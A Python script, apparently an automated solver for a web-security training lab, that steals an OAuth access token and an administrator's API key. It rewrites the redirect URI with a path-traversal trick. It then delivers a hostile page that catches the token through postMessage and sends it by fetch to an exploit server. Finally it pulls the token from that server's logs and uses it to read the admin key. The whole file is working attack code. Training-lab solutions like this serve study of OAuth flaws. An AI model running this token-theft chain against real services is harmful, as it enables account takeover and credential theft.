import requests
import re
import time
import json
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = None
        self.session = requests.Session()
        self.request_authorization_url = None
        self.authorization_code = None
        self.oauth_service_api_url = None
        self.admin_api_key = None

    def sign_in_as_my_account(self):
        response = self.session.get(self.lab_url + 'my-account')
        self.exploit_server_url = re.findall('<a id=\'exploit-link\' class=\'button\' target=\'_blank\' '
                                             'href=\'(.*)\'>', response.text)[0] + '/'
        self.request_authorization_url = re.findall('<meta.*url=(.*)\'>', response.text)[0]
        self.oauth_service_api_url = self.request_authorization_url.split('/auth')[0] + '/'
        self.request_authorization_url = (self.request_authorization_url
                                          .replace('/oauth-callback', '/oauth-callback/../post/comment/comment-form'))

    def deliver_exploit(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
            'responseBody': '',
            'formAction': 'DELIVER_TO_VICTIM'
        }
        response_body = '''
        <script>
            window.addEventListener('message', function(e) {{
                fetch("/" + encodeURIComponent(e.data.data))
            }}, false)
        </script>
        <iframe src="{}"></iframe>'''.format(self.request_authorization_url)
        data['responseBody'] = response_body
        self.session.post(self.exploit_server_url, data=data)

    def get_exploit_server_logs(self):
        response = self.session.get(self.exploit_server_url + 'log')
        self.authorization_code = re.findall(r'access_token%3D(.*?)%26', response.text)[-1]
        self.authorization_code = self.authorization_code.split('&amp;')[0]

    def get_admin_api_key(self):
        headers = {
            'Authorization': 'Bearer {}'.format(self.authorization_code)
        }
        response = self.session.get(self.oauth_service_api_url + 'me', headers=headers)
        self.admin_api_key = json.loads(response.text)['apikey']

    def submit_solution(self):
        data = {
            'answer': self.admin_api_key
        }
        self.session.post(self.lab_url + 'submitSolution', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_my_account()
        self.deliver_exploit()
        time.sleep(5)
        self.get_exploit_server_logs()
        self.get_admin_api_key()
        self.submit_solution()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
